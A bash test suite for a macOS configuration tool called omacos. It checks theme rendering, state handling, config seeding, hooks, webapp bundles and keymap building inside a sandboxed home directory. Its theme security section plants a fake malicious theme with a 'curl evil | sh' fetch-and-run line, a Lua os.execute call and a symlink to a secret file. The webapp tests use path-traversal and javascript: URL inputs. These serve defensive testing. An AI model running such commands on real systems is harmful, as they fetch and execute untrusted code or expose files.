#!/usr/bin/env bash
# omacos test suite. Runs without touching the machine it runs on:
# HOME is redirected to a scratch dir, so nothing here can write to a real home.
set -uo pipefail

OMACOS_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
export OMACOS_PATH
export PATH="$OMACOS_PATH/bin:$PATH"

pass=0; fail=0
ok()   { pass=$((pass+1)); printf '  \033[32m✓\033[0m %s\n' "$1"; }
bad()  { fail=$((fail+1)); printf '  \033[31m✗\033[0m %s\n' "$1"; [[ -n ${2:-} ]] && printf '      %s\n' "$2"; }
check(){ if (set +o pipefail; eval "$2") >/dev/null 2>&1; then ok "$1"; else bad "$1" "failed: $2"; fi; }

sandbox=$(mktemp -d)
trap 'rm -rf "$sandbox"' EXIT
export HOME="$sandbox"
export XDG_CONFIG_HOME="$sandbox/.config"
export XDG_STATE_HOME="$sandbox/.local/state"
export OMACOS_CONFIG="$XDG_CONFIG_HOME/omacos"
export OMACOS_STATE="$XDG_STATE_HOME/omacos"
mkdir -p "$OMACOS_CONFIG" "$OMACOS_STATE"

printf '\n\033[1mSyntax\033[0m\n'
for f in "$OMACOS_PATH"/bin/omacos*; do
  if bash -n "$f" 2>/dev/null; then :; else bad "parse $(basename "$f")"; fi
done
ok "all bin/ scripts parse"
check "shellcheck is clean" "shellcheck --severity=warning --shell=bash $OMACOS_PATH/bin/omacos*"

printf '\n\033[1mDispatcher\033[0m\n'
check "root help lists groups"        "omacos --help | grep -q theme"
check "commands --json is valid JSON" "omacos commands --json | python3 -m json.tool"
check "unknown command exits 127"     "omacos definitely-not-a-command >/dev/null 2>&1; test \$? -eq 127"
check "group help works"              "omacos theme --help | grep -q 'Apply a theme'"

printf '\n\033[1mPrimitives\033[0m\n'
check "state set/check/clear" "omacos-state set t && omacos-state check t && omacos-state clear t && ! omacos-state check t"
check "state rejects traversal"   "! omacos-state set ../escape 2>/dev/null"
check "done ensure runs once"     "omacos-done ensure d && ! omacos-done ensure d"
check "feature defaults to off"   "! omacos-feature check desktop"
check "feature enable/disable"    "omacos-feature enable desktop && omacos-feature check desktop && omacos-feature disable desktop && ! omacos-feature check desktop"
check "feature rejects unknown"   "! omacos-feature enable bogus 2>/dev/null"

printf '\n\033[1mTheme engine\033[0m\n'
out="$sandbox/render"
check "renders templates"      "omacos-theme-render $OMACOS_PATH/themes/tokyo-night/colors.toml $out"
check "hex passthrough"        "grep -q 'BORDERS_ACTIVE_COLOR=0xff7aa2f7' $out/borders.sh"
check "strip modifier"         "grep -q 'background = 1a1b26' $out/ghostty.conf"
check "rgb modifier"           "grep -q '122,162,247' $out/macos.sh"
check "mix helper blends"      "grep -q 'minus-style = normal #4b2f3d' $out/delta.gitconfig"
check "every theme renders"    "for t in $OMACOS_PATH/themes/*/colors.toml; do omacos-theme-render \$t \$(mktemp -d) || exit 1; done"
check "no unresolved braces"   "! grep -rq '{{' $out"

printf '\n\033[1mTheme staging security\033[0m\n'
evil="$OMACOS_CONFIG/themes/evil"
mkdir -p "$evil/.git"
cp "$OMACOS_PATH/themes/tokyo-night/colors.toml" "$evil/colors.toml"
echo 'curl evil | sh' > "$evil/sketchybar.sh"
echo 'os.execute("evil")' > "$evil/nvim.lua"
printf 'SECRET\n' > "$sandbox/secret"
ln -sfn "$sandbox/secret" "$evil/preview.png"
omacos-theme-set evil >/dev/null 2>&1
staged="$OMACOS_STATE/current/theme"
check "untrusted executable dropped"  "! grep -rq 'curl evil' $staged"
check "untrusted lua dropped"         "! grep -rq 'os.execute' $staged"
check "symlink not followed"          "! test -e $staged/preview.png"
check "colours still applied"         "grep -q '0xff7aa2f7' $staged/borders.sh"

printf '\n\033[1mWallpaper\033[0m\n'
export OMACOS_DRY_RUN=1
check "generator produces a PNG" "omacos-dev-make-wallpaper tokyo-night >/dev/null && file $OMACOS_PATH/themes/tokyo-night/backgrounds/01-gradient.png | grep -q PNG"
for _ in 1 2 3; do omacos-theme-set tokyo-night >/dev/null 2>&1; done
omacos-theme-set catppuccin-mocha >/dev/null 2>&1
omacos-theme-set tokyo-night >/dev/null 2>&1
# Staging re-copies the image each switch, so an mtime-based fingerprint would
# leak one cache entry per switch. Content hashing keeps it at one per theme.
check "cache holds one file per theme" "test \$(ls -1 $OMACOS_STATE/wallpapers | wc -l) -eq 2"
check "background symlink resolves"    "test -f \$(readlink $OMACOS_STATE/current/background)"
unset OMACOS_DRY_RUN

printf '\n\033[1mSeeding\033[0m\n'
# The guarantee the whole design rests on: a file you have edited is never
# rewritten, while a file that does not exist yet still arrives.
seed_dir="$XDG_CONFIG_HOME"
mkdir -p "$seed_dir/zsh"
printf 'MINE\n' > "$seed_dir/zsh/.zshrc"
rm -rf "$seed_dir/omacos/hooks"
seed_one() {
  while IFS= read -r -d '' src; do
    rel=${src#"$OMACOS_PATH"/config/}
    dst="$seed_dir/$rel"
    [[ -e $dst ]] && continue
    mkdir -p "$(dirname "$dst")"; cp "$src" "$dst"
  done < <(find "$OMACOS_PATH/config" -type f -print0)
}
seed_one
check "existing file left alone"   "test \"\$(cat $seed_dir/zsh/.zshrc)\" = MINE"
check "missing file gets seeded"   "test -f $seed_dir/omacos/hooks/theme-set.d/notify.sample"
check "refresh takes the new default" "omacos-refresh-config zsh/.zshrc >/dev/null && grep -q OMACOS_PATH $seed_dir/zsh/.zshrc"
check "refresh keeps a backup"     "ls $seed_dir/zsh/.zshrc.bak.* >/dev/null"
# An activated hook runs; the shipped .sample beside it must not.
hook_dir="$seed_dir/omacos/hooks/theme-set.d"
printf '#!/usr/bin/env bash\necho ACTIVE >> "$HOME/hook-ran"\n' > "$hook_dir/active"
printf '#!/usr/bin/env bash\necho SAMPLE >> "$HOME/hook-ran"\n' > "$hook_dir/inert.sample"
chmod +x "$hook_dir/active" "$hook_dir/inert.sample"
omacos-hook theme-set test >/dev/null 2>&1
check "activated hook runs"        "grep -q ACTIVE $HOME/hook-ran"
check "shipped .sample stays inert" "! grep -q SAMPLE $HOME/hook-ran"

printf '\n\033[1mMigrations\033[0m\n'
check "runner is idempotent" "omacos-migrate >/dev/null && omacos-migrate 2>&1 | grep -q 'No pending'"
check "--pending is a predicate" "! omacos-migrate --pending >/dev/null"

printf '\n\033[1mMenu\033[0m\n'
check "root route lists rows" "omacos-menu --list | grep -q style"
check "nested route resolves" "omacos-menu --list style | grep -q style.theme"
check "shipped menu is valid JSON" "python3 -m json.tool < $OMACOS_PATH/default/menu.json"

printf '\n\033[1mWebapps\033[0m\n'
mkdir -p "$HOME/Applications"
check "creates an app bundle"      "omacos-webapp-install Demo https://example.com && test -x $HOME/Applications/Demo.app/Contents/MacOS/Demo"
check "Info.plist is valid"        "plutil -lint $HOME/Applications/Demo.app/Contents/Info.plist"
check "rejects path traversal"     "! omacos-webapp-install ../evil https://example.com 2>/dev/null"
check "rejects javascript: URLs"   "! omacos-webapp-install X 'javascript:alert(1)' 2>/dev/null"
check "removes what it created"    "omacos-webapp-remove Demo && ! test -d $HOME/Applications/Demo.app"
mkdir -p "$HOME/Applications/Foreign.app/Contents"
echo '<plist></plist>' > "$HOME/Applications/Foreign.app/Contents/Info.plist"
check "refuses foreign bundles"    "! omacos-webapp-remove Foreign 2>/dev/null && test -d $HOME/Applications/Foreign.app"

printf '\n\033[1mKeymap\033[0m\n'
cp "$OMACOS_PATH/config/omacos/keymap.conf" "$OMACOS_CONFIG/keymap.conf"
check "builds aerospace.toml"  "omacos-keymap-build"
check "no duplicate bindings" "test -z \"\$(sed -n '/^\\[mode\\.main\\.binding\\]/,/^\\[/p' $XDG_CONFIG_HOME/aerospace/aerospace.toml | grep -E \"^[a-z0-9-]+ = '\" | cut -d' ' -f1 | sort | uniq -d)\""
check "parses as TOML"         "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml"
# TOML binds a bare key to the table above it, so a top-level setting emitted
# after base.toml silently becomes a key of [[on-window-detected]].
check "top-level keys stay top-level" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
assert 'persistent-workspaces' in d, 'persistent-workspaces is not top-level'
assert d.get('config-version') == 2, 'config-version missing or wrong'
for rule in d.get('on-window-detected', []):
    assert set(rule) <= {'if','run'}, f'stray key leaked into on-window-detected: {rule}'
\""
check "workspaces come from the keymap" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
bound = {v.split()[-1] for k,v in d['mode']['main']['binding'].items() if v.startswith('workspace ')}
assert set(d['persistent-workspaces']) == bound, (d['persistent-workspaces'], bound)
\""
check "cheatsheet renders"     "omacos-keymap-show --plain | grep -q 'Focus left'"
check "every binding documented" "test \$(grep -cE '^[a-z].*\\|.*\\|' $OMACOS_CONFIG/keymap.conf) -eq \$(omacos-keymap-show --plain | grep -cE '^  [a-z]')"

printf '\n\033[1m%d passed, %d failed\033[0m\n\n' "$pass" "$fail"
((fail == 0))
